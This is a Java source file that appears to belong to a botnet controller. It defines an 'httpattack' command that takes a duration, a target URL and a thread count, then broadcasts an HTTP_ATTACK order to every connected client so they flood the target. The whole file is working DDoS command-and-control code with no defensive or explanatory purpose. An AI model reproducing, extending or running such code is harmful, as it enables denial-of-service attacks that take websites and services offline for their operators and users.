package net.vitox.command.commands;

import net.vitox.Main;
import net.vitox.command.Command;
import net.vitox.user.User;
import net.vitox.user.UserHandler;
import net.vitox.utils.SendUtil;

public class HTTPAttackCommand extends Command {

    public HTTPAttackCommand() {
        super("httpattack", "Starting the eclipse.");
    }

    @Override
    public void runCommand(String[] args) {
        try {

            if (args.length <= 3) {
                System.out.println("Missing arguments: .httpattack <duration in ms> <ip> <threads per core>");
                return;
            }

            if (!args[2].startsWith("http")) {
                System.out.println("The URL must contain HTTP / HTTPS");
                return;
            }

            for (User user : UserHandler.userList) {
                SendUtil.getInstance().writeMsg("HTTP_ATTACK" + Main.TRIM_CHAR + args[1] + Main.TRIM_CHAR + args[2] + Main.TRIM_CHAR + args[3], user.getSocket());
            }

            System.out.println("Succesfully sent attack commands to: " + args[2] + ". Using: " + UserHandler.userList.size() + " clients. For " + args[1] + "ms using " + args[3] + " threads");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
